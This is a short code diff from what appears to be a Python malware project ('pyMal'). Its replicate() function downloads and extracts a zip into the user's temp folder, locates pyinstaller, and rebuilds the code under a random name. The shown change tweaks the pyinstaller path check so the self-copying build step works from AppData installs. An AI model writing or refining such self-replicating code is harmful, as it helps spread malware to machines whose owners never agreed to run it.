@@ -15,7 +15,7 @@ def replicate():
     if download_file(path,our_zip):
         if extract_zip(BaseTempFolder.format(os.getlogin()),path):
             pyinstaller_place = find_python_path().replace('python.exe','scripts/pyinstaller.exe')
-            if 'program' in pyinstaller_place.lower():
+            if 'program' in pyinstaller_place.lower() and 'appdata' not in pyinstaller_place.lower():
                 pyinstaller_place = f"pyinstaller.exe"
             random_name = random_string(is_random=True)
             original_location = os.path.join(BaseTempFolder.format(os.getlogin()),'pyMal-main')
